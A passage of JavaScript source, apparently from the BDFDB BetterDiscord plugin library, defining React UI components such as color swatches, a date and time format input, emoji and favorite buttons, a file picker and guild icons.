								color: useWhite ? BDFDB.DiscordConstants.Colors.WHITE : BDFDB.DiscordConstants.Colors.BLACK
							}) : null,
							props.isSelected && !props.isSingle ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
								name: Internal.LibraryComponents.SvgIcon.Names.CHECKMARK,
								width: props.isCustom ? 32 : 16,
								height: props.isCustom ? 24 : 16,
								color: useWhite ? BDFDB.DiscordConstants.Colors.WHITE : BDFDB.DiscordConstants.Colors.BLACK
							}) : null
						]
					});
					if (props.isCustom || props.isSingle || props.color == null) swatch = BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, {
						text: props.isCustom || props.isSingle ? BDFDB.LanguageUtils.LanguageStrings.CUSTOM_COLOR : BDFDB.LanguageUtils.LanguageStrings.DEFAULT,
						tooltipConfig: {type: props.isSingle ? "top" : "bottom"},
						children: swatch
					});
					if (props.isCustom || props.isSingle) swatch = BDFDB.ReactUtils.createElement(Internal.LibraryComponents.PopoutContainer, {
						children: swatch,
						wrap: false,
						popoutClassName: BDFDB.disCNS.colorpickerwrapper + BDFDB.disCN.colorpicker,
						animation: Internal.LibraryComponents.PopoutContainer.Animation.TRANSLATE,
						position: Internal.LibraryComponents.PopoutContainer.Positions.BOTTOM,
						align: Internal.LibraryComponents.PopoutContainer.Align.CENTER,
						open: swatches.props.pickerOpen,
						onClick: _ => swatches.props.pickerOpen = true,
						onOpen: _ => {
							swatches.props.pickerOpen = true;
							if (typeof swatches.props.onPickerOpen == "function") swatches.props.onPickerOpen(this);
						},
						onClose: _ => {
							delete swatches.props.pickerOpen;
							if (typeof swatches.props.onPickerClose == "function") swatches.props.onPickerClose(this);
						},
						renderPopout: _ => BDFDB.ReactUtils.createElement(Internal.LibraryComponents.ColorPicker, Object.assign({}, swatches.props.pickerConfig, {
							color: swatches.props.color,
							onColorChange: color => {
								if (typeof swatches.props.onColorChange == "function") swatches.props.onColorChange(color);
								props.color = color;
								swatches.props.color = color;
								swatches.props.customColor = color;
								swatches.props.customSelected = true;
								BDFDB.ReactUtils.forceUpdate(swatches);
							}
						}), true)
					});
					if (props.isCustom) swatch = BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.disCN.colorpickerswatchcustomcontainer,
						children: swatch
					});
					return swatch;
				}
				render() {
					this.props.color = BDFDB.ObjectUtils.is(this.props.color) ? this.props.color : BDFDB.ColorUtils.convert(this.props.color, "RGBA");
					this.props.colors = (BDFDB.ArrayUtils.is(this.props.colors) ? this.props.colors : [null, 5433630, 3066993, 1752220, 3447003, 3429595, 8789737, 10181046, 15277667, 15286558, 15158332, 15105570, 15844367, 13094093, 7372936, 6513507, 16777215, 3910932, 2067276, 1146986, 2123412, 2111892, 7148717, 7419530, 11342935, 11345940, 10038562, 11027200, 12745742, 9936031, 6121581, 2894892]).map(c => BDFDB.ColorUtils.convert(c, "RGBA"));
					this.props.colorRows = this.props.colors.length ? [this.props.colors.slice(0, parseInt(this.props.colors.length/2)), this.props.colors.slice(parseInt(this.props.colors.length/2))] : [];
					this.props.customColor = !this.props.color || !this.props.customSelected && this.props.colors.indexOf(this.props.color) > -1 ? null : this.props.color;
					this.props.defaultCustomColor = BDFDB.ObjectUtils.is(this.props.defaultCustomColor) ? this.props.defaultCustomColor : BDFDB.ColorUtils.convert(this.props.defaultCustomColor, "RGBA");
					this.props.customSelected = !!this.props.customColor;
					this.props.pickerConfig = BDFDB.ObjectUtils.is(this.props.pickerConfig) ? this.props.pickerConfig : {gradient: true, alpha: true};
					
					const isSingle = !this.props.colors.length;
					return BDFDB.ReactUtils.createElement("div", {
						className: isSingle ? BDFDB.disCN.colorpickerswatchsinglewrapper : BDFDB.DOMUtils.formatClassName(BDFDB.disCN.colorpickerswatches, BDFDB.disCN.colorpickerswatchescontainer, this.props.disabled && BDFDB.disCN.colorpickerswatchesdisabled),
						children: [
							BDFDB.ReactUtils.createElement(this.ColorSwatch, {
								swatches: this,
								color: this.props.customColor,
								isSingle: isSingle,
								isCustom: !isSingle,
								isSelected: this.props.customSelected,
								isDisabled: this.props.disabled,
								pickerOpen: this.props.pickerOpen,
								style: {margin: 0}
							}),
							!isSingle && BDFDB.ReactUtils.createElement("div", {
								children: this.props.colorRows.map(row => BDFDB.ReactUtils.createElement("div", {
									className: BDFDB.disCN.colorpickerrow,
									children: row.map(color => BDFDB.ReactUtils.createElement(this.ColorSwatch, {
										swatches: this,
										color: color,
										isCustom: false,
										isSelected: !this.props.customSelected && color == this.props.color,
										isDisabled: this.props.disabled
									}))
								}))
							}) 
						]
					});
				}
			};

			CustomComponents.DateInput = class BDFDB_DateInput extends Internal.LibraryModules.React.Component {
				renderFormatButton(props) {
					const button = BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Clickable, {
						className: BDFDB.disCN.dateinputbutton,
						children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
							name: props.svgName,
							width: 20,
							height: 20
						})
					});
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.PopoutContainer, {
						width: props.popoutWidth || 350,
						padding: 10,
						animation: Internal.LibraryComponents.PopoutContainer.Animation.SCALE,
						position: Internal.LibraryComponents.PopoutContainer.Positions.TOP,
						align: Internal.LibraryComponents.PopoutContainer.Align.RIGHT,
						onClose: instance => BDFDB.DOMUtils.removeClass(instance.domElementRef.current, BDFDB.disCN.dateinputbuttonselected),
						renderPopout: instance => {
							BDFDB.DOMUtils.addClass(instance.domElementRef.current, BDFDB.disCN.dateinputbuttonselected);
							return props.children || BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
								align: Internal.LibraryComponents.Flex.Align.CENTER,
								children: [
									props.name && BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SettingsLabel, {
										label: props.name
									}),
									BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextInput, {
										className: BDFDB.disCN.dateinputfield,
										placeholder: props.placeholder,
										value: props.getValue(),
										onChange: typeof props.onChange == "function" ? props.onChange : null
									}),
									props.tooltipText && this.renderInfoButton(props.tooltipText)
								].filter(n => n)
							})
						},
						children: props.name ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, {
							text: props.name,
							children: button
						}) : button
					});
				}
				renderInfoButton(text, style) {
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, {
						text: [text].flat(10).filter(n => n).map(n => BDFDB.ReactUtils.createElement("div", {children: n})),
						tooltipConfig: {
							type: "bottom",
							zIndex: 1009,
							maxWidth: 560
						},
						children: BDFDB.ReactUtils.createElement("div", {
							className: BDFDB.disCN.dateinputbutton,
							style: Object.assign({}, style),
							children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
								name: Internal.LibraryComponents.SvgIcon.Names.QUESTIONMARK,
								width: 24,
								height: 24
							})
						})
					});
				}
				handleChange() {
					if (typeof this.props.onChange == "function") this.props.onChange(BDFDB.ObjectUtils.extract(this.props, "formatString", "dateString", "timeString", "timeOffset", "language"));
				}
				render() {
					let input = this, formatter, preview;
					const defaultOffset = ((new Date()).getTimezoneOffset() * (-1/60));
					return BDFDB.ReactUtils.createElement("div", BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.dateinputwrapper, this.props.className),
						children: [
							BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SettingsLabel, {
								label: this.props.label
							}),
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.dateinputinner,
								children: [
									BDFDB.ReactUtils.createElement("div", {
										className: BDFDB.disCN.dateinputcontrols,
										children: [
											BDFDB.ReactUtils.createElement(class DateInputPreview extends Internal.LibraryModules.React.Component {
												componentDidMount() {formatter = this;}
												render() {
													return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextInput, {
														className: BDFDB.disCN.dateinputfield,
														placeholder: Internal.LibraryComponents.DateInput.getDefaultString(input.props.language),
														value: input.props.formatString,
														onChange: value => {
															input.props.formatString = value;
															input.handleChange.apply(input, []);
															BDFDB.ReactUtils.forceUpdate(formatter, preview);
														}
													});
												}
											}),
											this.renderInfoButton([
												"$date will be replaced with the Date",
												"$time will be replaced with the Time",
												"$time12 will be replaced with the Time (12h Form)",
												"$month will be replaced with the Month Name",
												"$monthS will be replaced with the Month Name (Short Form)",
												"$day will be replaced with the Weekday Name",
												"$dayS will be replaced with the Weekday Name (Short Form)",
												"$agoAmount will be replaced with ('Today', 'Yesterday', 'x days/weeks/months ago')",
												"$agoDays will be replaced with ('Today', 'Yesterday', 'x days ago')",
												"$agoDate will be replaced with ('Today', 'Yesterday', $date)"
											], {marginRight: 6}),
											this.renderFormatButton({
												name: BDFDB.LanguageUtils.LanguageStrings.DATE,
												svgName: Internal.LibraryComponents.SvgIcon.Names.CALENDAR,
												placeholder: this.props.dateString,
												getValue: _ => this.props.dateString,
												tooltipText: [
													"$d will be replaced with the Day",
													"$dd will be replaced with the Day (Forced Zeros)",
													"$m will be replaced with the Month",
													"$mm will be replaced with the Month (Forced Zeros)",
													"$yy will be replaced with the Year (2-Digit)",
													"$yyyy will be replaced with the Year (4-Digit)",
													"$month will be replaced with the Month Name",
													"$monthS will be replaced with the Month Name (Short Form)",
												],
												onChange: value => {
													this.props.dateString = value;
													this.handleChange.apply(this, []);
													BDFDB.ReactUtils.forceUpdate(formatter, preview);
												}
											}),
											this.renderFormatButton({
												name: BDFDB.LanguageUtils.LibraryStrings.time,
												svgName: Internal.LibraryComponents.SvgIcon.Names.CLOCK,
												placeholder: this.props.timeString,
												getValue: _ => this.props.timeString,
												tooltipText: [
													"$h will be replaced with the Hours",
													"$hh will be replaced with the Hours (Forced Zeros)",
													"$m will be replaced with the Minutes",
													"$mm will be replaced with the Minutes (Forced Zeros)",
													"$s will be replaced with the Seconds",
													"$ss will be replaced with the Seconds (Forced Zeros)",
													"$u will be replaced with the Milliseconds",
													"$uu will be replaced with the Milliseconds (Forced Zeros)"
												],
												onChange: value => {
													this.props.timeString = value;
													this.handleChange.apply(this, []);
													BDFDB.ReactUtils.forceUpdate(formatter, preview);
												}
											}),
											this.renderFormatButton({
												name: BDFDB.LanguageUtils.LibraryStrings.location,
												svgName: Internal.LibraryComponents.SvgIcon.Names.GLOBE,
												popoutWidth: 550,
												children: [
													BDFDB.ReactUtils.createElement(Internal.LibraryComponents.AutoFocusCatcher, {}),
													BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
														className: BDFDB.disCN.marginbottom4,
														align: Internal.LibraryComponents.Flex.Align.CENTER,
														children: [
															BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SettingsLabel, {
																label: BDFDB.LanguageUtils.LanguageStrings.LANGUAGE
															}),
															BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Select, {
																className: BDFDB.disCN.dateinputfield,
																value: this.props.language != null ? this.props.language : "$discord",
																options: Object.keys(BDFDB.LanguageUtils.languages).map(id => ({
																	value: id,
																	label: BDFDB.LanguageUtils.getName(BDFDB.LanguageUtils.languages[id])
																})),
																searchable: true,
																optionRenderer: lang => lang.label,
																onChange: value => {
																	this.props.language = value == "$discord" ? undefined : value;
																	this.handleChange.apply(this, []);
																	BDFDB.ReactUtils.forceUpdate(formatter, preview);
																}
															})
														]
													}),
													BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
														align: Internal.LibraryComponents.Flex.Align.CENTER,
														children: [
															BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SettingsLabel, {
																label: BDFDB.LanguageUtils.LibraryStrings.timezone
															}),
															BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Select, {
																className: BDFDB.disCN.dateinputfield,
																value: this.props.timeOffset != null ? this.props.timeOffset : defaultOffset,
																options: [-12.0, -11.0, -10.0, -9.5, -9.0, -8.0, -7.0, -6.0, -5.0, -4.0, -3.5, -3.0, -2.0, -1.0, 0.0, 1.0, 2.0, 3.0, 3.5, 4.0, 4.5, 5.0, 5.5, 5.75, 6.0, 6.5, 7.0, 8.0, 8.75, 9.0, 9.5, 10.0, 10.5, 11.0, 12.0, 12.75, 13.0, 14.0].map(offset => ({label: offset< 0 ? offset : `+${offset}`, value: offset})),
																searchable: true,
																onChange: value => {
																	this.props.timeOffset = value == defaultOffset ? undefined : value;
																	this.handleChange.apply(this, []);
																	BDFDB.ReactUtils.forceUpdate(formatter, preview);
																}
															})
														]
													})
												]
											})
										]
									}),
									BDFDB.ReactUtils.createElement(class DateInputPreview extends Internal.LibraryModules.React.Component {
										componentDidMount() {preview = this;}
										render() {
											return !input.props.noPreview && BDFDB.ReactUtils.createElement("div", {
												className: BDFDB.disCN.dateinputpreview,
												children: [
													input.props.prefix && BDFDB.ReactUtils.createElement("div", {
														className: BDFDB.disCN.dateinputpreviewprefix,
														children: typeof input.props.prefix == "function" ? input.props.prefix(input) : input.props.prefix,
													}),
													BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextScroller, {
														children: Internal.LibraryComponents.DateInput.format(input.props, new Date((new Date()) - (1000*60*60*24*2)))
													}),
													input.props.suffix && BDFDB.ReactUtils.createElement("div", {
														className: BDFDB.disCN.dateinputpreviewsuffix,
														children: typeof input.props.suffix == "function" ? input.props.suffix(input) : input.props.suffix,
													})
												].filter(n => n)
											});
										}
									})
								]
							})
						]
					}), "onChange", "label", "formatString", "dateString", "timeString", "timeOffset", "language", "noPreview", "prefix", "suffix"));
				}
			};
			CustomComponents.DateInput.getDefaultString = function (language) {
				language = language || BDFDB.LanguageUtils.getLanguage().id;
				const date = new Date();
				return date.toLocaleString(language).replace(date.toLocaleDateString(language), "$date").replace(date.toLocaleTimeString(language, {hourCycle: "h12"}), "$time12").replace(date.toLocaleTimeString(language, {hourCycle: "h11"}), "$time12").replace(date.toLocaleTimeString(language, {hourCycle: "h24"}), "$time").replace(date.toLocaleTimeString(language, {hourCycle: "h23"}), "$time");
			};
			CustomComponents.DateInput.parseDate = function (date, offset) {
				let timeObj = date;
				if (typeof timeObj == "string") {
					const language = BDFDB.LanguageUtils.getLanguage().id;
					for (let i = 0; i < 12; i++) {
						const tempDate = new Date();
						tempDate.setMonth(i);
						timeObj = timeObj.replace(tempDate.toLocaleDateString(language, {month:"long"}), tempDate.toLocaleDateString("en", {month:"short"}));
					}
					timeObj = new Date(timeObj);
				}
				else if (typeof timeObj == "number") timeObj = new Date(timeObj);
				
				if (timeObj.toString() == "Invalid Date") timeObj = new Date(parseInt(date));
				if (timeObj.toString() == "Invalid Date" || typeof timeObj.toLocaleDateString != "function") timeObj = new Date();
				offset = offset != null && parseFloat(offset);
				if ((offset || offset === 0) && !isNaN(offset)) timeObj = new Date(timeObj.getTime() + ((offset - timeObj.getTimezoneOffset() * (-1/60)) * 60*60*1000));
				return timeObj;
			};
			CustomComponents.DateInput.format = function (data, time) {
				if (typeof data == "string") data = {formatString: data};
				if (data && typeof data.formatString != "string") data.formatString = "";
				if (!data || typeof data.formatString != "string" || !time) return "";
				
				const language = data.language || BDFDB.LanguageUtils.getLanguage().id;
				const timeObj = Internal.LibraryComponents.DateInput.parseDate(time, data.timeOffset);
				const now = new Date();
				const daysAgo = Math.round((Date.UTC(now.getFullYear(), now.getMonth(), now.getDate()) - Date.UTC(timeObj.getFullYear(), timeObj.getMonth(), timeObj.getDate()))/(1000*60*60*24));
				const date = data.dateString && typeof data.dateString == "string" ? Internal.LibraryComponents.DateInput.formatDate({dateString: data.dateString, language: language}, timeObj) : timeObj.toLocaleDateString(language);
				
				return (data.formatString || Internal.LibraryComponents.DateInput.getDefaultString(language))
					.replace(/\$date/g, date)
					.replace(/\$time12/g, data.timeString && typeof data.timeString == "string" ? Internal.LibraryComponents.DateInput.formatTime({timeString: data.timeString, language: language}, timeObj, true) : timeObj.toLocaleTimeString(language, {hourCycle: "h12"}))
					.replace(/\$time/g, data.timeString && typeof data.timeString == "string" ? Internal.LibraryComponents.DateInput.formatTime({timeString: data.timeString, language: language}, timeObj) : timeObj.toLocaleTimeString(language, {hourCycle: "h23"}))
					.replace(/\$monthS/g, timeObj.toLocaleDateString(language, {month: "short"}))
					.replace(/\$month/g, timeObj.toLocaleDateString(language, {month: "long"}))
					.replace(/\$dayS/g, timeObj.toLocaleDateString(language, {weekday: "short"}))
					.replace(/\$day/g, timeObj.toLocaleDateString(language, {weekday: "long"}))
					.replace(/\$agoAmount/g, daysAgo < 0 ? "" : daysAgo > 1 ? Internal.DiscordObjects.Timestamp(timeObj.getTime()).fromNow() : BDFDB.LanguageUtils.LanguageStrings[`SEARCH_SHORTCUT_${daysAgo == 1 ? "YESTERDAY" : "TODAY"}`])
					.replace(/\$agoDays/g, daysAgo < 0 ? "" : daysAgo > 1 ? BDFDB.LanguageUtils.LanguageStringsFormat(`GAME_LIBRARY_LAST_PLAYED_DAYS`, daysAgo) : BDFDB.LanguageUtils.LanguageStrings[`SEARCH_SHORTCUT_${daysAgo == 1 ? "YESTERDAY" : "TODAY"}`])
					.replace(/\$agoDate/g, daysAgo < 0 ? "" : daysAgo > 1 ? date : BDFDB.LanguageUtils.LanguageStrings[`SEARCH_SHORTCUT_${daysAgo == 1 ? "YESTERDAY" : "TODAY"}`])
					.replace(/\(\)|\[\]/g, "").replace(/,\s*$|^\s*,/g, "").replace(/ +/g, " ").trim();
			};
			CustomComponents.DateInput.formatDate = function (data, time) {
				if (typeof data == "string") data = {dateString: data};
				if (data && typeof data.dateString != "string") return "";
				if (!data || typeof data.dateString != "string" || !data.dateString || !time) return "";
				
				const language = data.language || BDFDB.LanguageUtils.getLanguage().id;
				const timeObj = Internal.LibraryComponents.DateInput.parseDate(time, data.timeOffset);
				
				return data.dateString
					.replace(/\$monthS/g, timeObj.toLocaleDateString(language, {month: "short"}))
					.replace(/\$month/g, timeObj.toLocaleDateString(language, {month: "long"}))
					.replace(/\$dd/g, timeObj.toLocaleDateString(language, {day: "2-digit"}))
					.replace(/\$d/g, timeObj.toLocaleDateString(language, {day: "numeric"}))
					.replace(/\$mm/g, timeObj.toLocaleDateString(language, {month: "2-digit"}))
					.replace(/\$m/g, timeObj.toLocaleDateString(language, {month: "numeric"}))
					.replace(/\$yyyy/g, timeObj.toLocaleDateString(language, {year: "numeric"}))
					.replace(/\$yy/g, timeObj.toLocaleDateString(language, {year: "2-digit"}))
					.trim();
			};
			CustomComponents.DateInput.formatTime = function (data, time, hour12) {
				if (typeof data == "string") data = {timeString: data};
				if (data && typeof data.timeString != "string") return "";
				if (!data || typeof data.timeString != "string" || !data.timeString || !time) return "";
				
				const language = data.language || BDFDB.LanguageUtils.getLanguage().id;
				const timeObj = Internal.LibraryComponents.DateInput.parseDate(time, data.timeOffset);
				
				let hours = timeObj.getHours();
				if (hour12) {
					hours = hours == 0 ? 12 : hours;
					if (hours > 12) hours -= 12;
				}
				const minutes = timeObj.getMinutes();
				const seconds = timeObj.getSeconds();
				const milli = timeObj.getMilliseconds();
				
				let string = data.timeString
					.replace(/\$hh/g, hours < 10 ? `0${hours}` : hours)
					.replace(/\$h/g, hours)
					.replace(/\$mm/g, minutes < 10 ? `0${minutes}` : minutes)
					.replace(/\$m/g, minutes)
					.replace(/\$ss/g, seconds < 10 ? `0${seconds}` : seconds)
					.replace(/\$s/g, seconds)
					.replace(/\$uu/g, milli < 10 ? `00${seconds}` : milli < 100 ? `0${milli}` : milli)
					.replace(/\$u/g, milli)
					.trim();

				let digits = "\\d";
				if (BDFDB.LanguageUtils.languages[language] && BDFDB.LanguageUtils.languages[language].numberMap) {
					digits = Object.entries(BDFDB.LanguageUtils.languages[language].numberMap).map(n => n[1]).join("");
					for (let number in BDFDB.LanguageUtils.languages[language].numberMap) string = string.replace(new RegExp(number, "g"), BDFDB.LanguageUtils.languages[language].numberMap[number]);
				}
				return hour12 ? timeObj.toLocaleTimeString(language, {hourCycle: "h12"}).replace(new RegExp(`[${digits}]{1,2}[^${digits}][${digits}]{1,2}[^${digits}][${digits}]{1,2}`, "g"), string) : string;
			};
			
			CustomComponents.EmojiPickerButton = reactInitialized && class BDFDB_EmojiPickerButton extends Internal.LibraryModules.React.Component {
				handleEmojiChange(emoji) {
					if (emoji != null) {
						this.props.emoji = emoji.id ? {
							id: emoji.id,
							name: emoji.name,
							animated: emoji.animated
						} : {
							id: null,
							name: emoji.optionallyDiverseSequence,
							animated: false
						};
						if (typeof this.props.onSelect == "function") this.props.onSelect(this.props.emoji, this);
						if (typeof this.close == "function" && !BDFDB.ListenerUtils.isPressed(16)) this.close();
						BDFDB.ReactUtils.forceUpdate(this);
					}
				}
				render() {
					let button = this;
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.PopoutContainer, {
						children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.EmojiButton, {
							className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.emojiinputbutton),
							renderButtonContents: this.props.emoji ? _ => BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Emoji, {
								className: BDFDB.disCN.emoji,
								emojiId: this.props.emoji.id,
								emojiName: this.props.emoji.name
							}) : null
						}),
						wrap: false,
						animation: Internal.LibraryComponents.PopoutContainer.Animation.NONE,
						position: Internal.LibraryComponents.PopoutContainer.Positions.TOP,
						align: Internal.LibraryComponents.PopoutContainer.Align.LEFT,
						renderPopout: instance => {
							this.close = instance.close;
							return [
								BDFDB.ReactUtils.createElement(Internal.LibraryComponents.EmojiPicker, {
									closePopout: this.close,
									onSelectEmoji: this.handleEmojiChange.bind(this),
									allowManagedEmojis: this.props.allowManagedEmojis,
									allowManagedEmojisUsage: this.props.allowManagedEmojisUsage
								}),
								BDFDB.ReactUtils.createElement(class extends Internal.LibraryModules.React.Component {
									componentDidMount() {Internal.LibraryComponents.EmojiPickerButton.current = button;}
									componentWillUnmount() {delete Internal.LibraryComponents.EmojiPickerButton.current;}
									render() {return null;}
								})
							];
						}
					});
				}
			};
			Internal.setDefaultProps(CustomComponents.EmojiPickerButton, {allowManagedEmojis: false, allowManagedEmojisUsage: false});
			
			CustomComponents.FavButton = reactInitialized && class BDFDB_FavButton extends Internal.LibraryModules.React.Component {
				handleClick() {
					this.props.isFavorite = !this.props.isFavorite;
					if (typeof this.props.onClick == "function") this.props.onClick(this.props.isFavorite, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				render() {
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Clickable, {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.favbuttoncontainer, BDFDB.disCN.favbutton, this.props.isFavorite && BDFDB.disCN.favbuttonselected, this.props.className),
						onClick: this.handleClick.bind(this),
						children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
							name: Internal.LibraryComponents.SvgIcon.Names[this.props.isFavorite ? "FAVORITE_FILLED" : "FAVORITE"],
							width: this.props.width || 24,
							height: this.props.height || 24,
							className: BDFDB.disCN.favbuttonicon
						})
					});
				}
			};
			
			CustomComponents.FileButton = reactInitialized && class BDFDB_FileButton extends Internal.LibraryModules.React.Component {
				componentDidMount() {
					if (this.props.searchFolders) {
						let node = BDFDB.ReactUtils.findDOMNode(this);
						if (node && (node = node.querySelector("input[type='file']")) != null) {
							node.setAttribute("directory", "");
							node.setAttribute("webkitdirectory", "");
						}
					}
				}
				render() {
					let filter = this.props.filter && [this.props.filter].flat(10).filter(n => typeof n == "string") || [];
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Button, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						onClick: e => {e.currentTarget.querySelector("input").click();},
						children: [
							BDFDB.LanguageUtils.LibraryStrings.file_navigator_text,
							BDFDB.ReactUtils.createElement("input", {
								type: "file",
								accept: filter.length && (filter.join("/*,") + "/*"),
								style: {display: "none"},
								onChange: e => {
									let file = e.currentTarget.files[0];
									if (this.refInput && file && (!filter.length || filter.some(n => file.type.indexOf(n) == 0))) {
										this.refInput.props.value = this.props.searchFolders ? file.path.split(file.name).slice(0, -1).join(file.name) : `${this.props.mode == "url" ? "url('" : ""}${(this.props.useFilePath) ? file.path : `data:${file.type};base64,${Internal.LibraryRequires.fs.readFileSync(file.path).toString("base64")}`}${this.props.mode ? "')" : ""}`;
										BDFDB.ReactUtils.forceUpdate(this.refInput);
										this.refInput.handleChange(this.refInput.props.value);
									}
								}
							})
						]
					}), "filter", "mode", "useFilePath", "searchFolders"));
				}
			};
			
			CustomComponents.FormComponents = {};
			CustomComponents.FormComponents.FormItem = reactInitialized && class BDFDB_FormItem extends Internal.LibraryModules.React.Component {
				render() {
					return BDFDB.ReactUtils.createElement("div", {
						className: this.props.className,
						style: this.props.style,
						children: [
							BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
								align: Internal.LibraryComponents.Flex.Align.BASELINE,
								children: [
									this.props.title != null || this.props.error != null ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex.Child, {
										wrap: true,
										children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FormComponents.FormTitle, {
											tag: this.props.tag || Internal.LibraryComponents.FormComponents.FormTitle.Tags.H5,
											disabled: this.props.disabled,
											required: this.props.required,
											error: this.props.error,
											className: this.props.titleClassName,
											children: this.props.title
										})
									}) : null
								].concat([this.props.titleChildren].flat(10)).filter(n => n)
							}),
						].concat(this.props.children)
					});
				}
			};
			
			CustomComponents.GuildComponents = {};
			CustomComponents.GuildComponents.Guild = reactInitialized && class BDFDB_Guild extends Internal.LibraryModules.React.Component {
				constructor(props) {
					super(props);
					this.state = {hovered: false};
				}
				handleMouseEnter(e) {
					if (!this.props.sorting) this.setState({hovered: true});
					if (typeof this.props.onMouseEnter == "function") this.props.onMouseEnter(e, this);
				}
				handleMouseLeave(e) {
					if (!this.props.sorting) this.setState({hovered: false});
					if (typeof this.props.onMouseLeave == "function") this.props.onMouseLeave(e, this);
				}
				handleMouseDown(e) {
					if (!this.props.unavailable && this.props.guild && this.props.selectedChannelId) Internal.LibraryModules.DirectMessageUtils.preload(this.props.guild.id, this.props.selectedChannelId);
					if (e.button == 0 && typeof this.props.onMouseDown == "function") this.props.onMouseDown(e, this);
				}
				handleMouseUp(e) {
					if (e.button == 0 && typeof this.props.onMouseUp == "function") this.props.onMouseUp(e, this);
				}
				handleClick(e) {
					if (typeof this.props.onClick == "function") this.props.onClick(e, this);
				}
				handleContextMenu(e) {
					if (this.props.menu) BDFDB.GuildUtils.openMenu(this.props.guild, e);
					if (typeof this.props.onContextMenu == "function") this.props.onContextMenu(e, this);
				}
				setRef(e) {
					if (typeof this.props.setRef == "function") this.props.setRef(this.props.guild.id, e)
				}
				componentDidMount() {
					let node = BDFDB.ReactUtils.findDOMNode(this);
					if (node && node.nodeType != Node.TEXT_NODE) for (let child of node.querySelectorAll("a")) child.setAttribute("draggable", false);
				}
				render() {
					if (!this.props.guild) return null;
					
					this.props.guildId = this.props.guild.id;
					this.props.selectedChannelId = Internal.LibraryModules.LastChannelStore.getChannelId(this.props.guild.id);
					
					let currentVoiceChannel = Internal.LibraryModules.ChannelStore.getChannel(Internal.LibraryModules.CurrentVoiceUtils.getChannelId());
					let hasVideo = currentVoiceChannel && Internal.LibraryModules.VoiceUtils.hasVideo(currentVoiceChannel);
					
					this.props.selected = this.props.state ? Internal.LibraryModules.LastGuildStore.getGuildId() == this.props.guild.id : false;
					this.props.unread = this.props.state ? Internal.LibraryModules.UnreadGuildUtils.hasUnread(this.props.guild.id) : false;
					this.props.badge = this.props.state ? Internal.LibraryModules.UnreadGuildUtils.getMentionCount(this.props.guild.id) : 0;
					
					this.props.mediaState = Object.assign({}, this.props.mediaState, {
						audio: this.props.state ? currentVoiceChannel && currentVoiceChannel.guild_id == this.props.guild.id && !hasVideo : false,
						video: this.props.state ? currentVoiceChannel && currentVoiceChannel.guild_id == this.props.guild.id && hasVideo : false,
						screenshare: this.props.state ? !!Internal.LibraryModules.StreamUtils.getAllApplicationStreams().filter(stream => stream.guildId == this.props.guild.id)[0] : false,
						liveStage: this.props.state ? Object.keys(Internal.LibraryModules.StageChannelStore.getStageInstancesByGuild(this.props.guild.id)).length > 0 : false,
						hasLiveVoiceChannel: this.props.state && false ? !Internal.LibraryModules.MutedUtils.isMuted(this.props.guild.id) && BDFDB.ObjectUtils.toArray(Internal.LibraryModules.VoiceUtils.getVoiceStates(this.props.guild.id)).length > 0 : false,
						participating: this.props.state ? Internal.LibraryModules.CurrentVoiceUtils.getGuildId() == this.props.guild.id : false,
						participatingInStage: this.props.state ? currentVoiceChannel && currentVoiceChannel.guild_id == this.props.guild.id && currentVoiceChannel.isGuildStageVoice() : false
					});
					
					this.props.animatable = this.props.state ? this.props.guild.icon && Internal.LibraryModules.IconUtils.isAnimatedIconHash(this.props.guild.icon) : false;
					this.props.unavailable = this.props.state ? Internal.LibraryModules.GuildUnavailableStore.unavailableGuilds.includes(this.props.guild.id) : false;
				
					let isDraggedGuild = this.props.draggingGuildId === this.props.guild.id;
					let guild = isDraggedGuild ? BDFDB.ReactUtils.createElement("div", {
						children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.GuildComponents.DragPlaceholder, {})
					}) : BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.disCN.guildcontainer,
						children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.GuildComponents.BlobMask, {
							selected: this.state.isDropHovering || this.props.selected || this.state.hovered,
							upperBadge: this.props.unavailable ? Internal.LibraryModules.GuildBadgeUtils.renderUnavailableBadge() : Internal.LibraryModules.GuildBadgeUtils.renderMediaBadge(this.props.mediaState),
							lowerBadge: this.props.badge > 0 ? Internal.LibraryModules.GuildBadgeUtils.renderMentionBadge(this.props.badge) : null,
							lowerBadgeWidth: Internal.LibraryComponents.Badges.getBadgeWidthForValue(this.props.badge),
